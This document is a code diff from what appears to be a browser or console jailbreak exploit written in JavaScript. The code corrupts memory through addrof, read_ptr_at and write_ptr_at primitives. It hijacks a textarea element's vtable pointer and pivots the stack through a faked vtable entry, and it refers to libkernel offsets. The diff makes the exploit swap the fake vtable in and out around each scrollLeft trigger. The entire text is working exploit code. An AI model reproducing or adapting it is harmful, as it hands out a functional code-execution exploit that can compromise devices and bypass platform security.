@@ -110,7 +110,6 @@ var tarea = document.createElement('textarea');
 var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
 var fake_vt_ptr = malloc(0x400);
 write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
-write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
 
 var real_vtable = read_ptr_at(fake_vt_ptr);
 var fake_vtable = malloc(0x2000);
@@ -154,13 +153,17 @@ function saveall()
     var ans = malloc(0x800);
     var bak = read_ptr_at(fake_vtable+0x1d8);
     write_ptr_at(fake_vtable+0x1d8, saveall_addr);
+    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
     tarea.scrollLeft = 0;
+    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
     write_mem(ans, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
     var bak = read_ptr_at(fake_vtable+0x1d8);
     write_ptr_at(fake_vtable+0x1d8, saveall_addr);
     write_ptr_at(fake_vt_ptr+0x38, 0x1234);
+    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
     tarea.scrollLeft = 0;
+    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
     write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
     return ans;
@@ -178,7 +181,9 @@ function pivot(buf)
     var ans = malloc(0x400);
     var bak = read_ptr_at(fake_vtable+0x1d8);
     write_ptr_at(fake_vtable+0x1d8, saveall_addr);
+    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
     tarea.scrollLeft = 0;
+    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
     write_mem(ans, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
     var bak = read_ptr_at(fake_vtable+0x1d8);
@@ -186,7 +191,9 @@ function pivot(buf)
     write_ptr_at(fake_vt_ptr+0x38, buf);
     write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
     write_ptr_at(buf, ans);
+    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
     tarea.scrollLeft = 0;
+    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
 }
 var sys_545_addr = libkernel_base + 0x264a0;
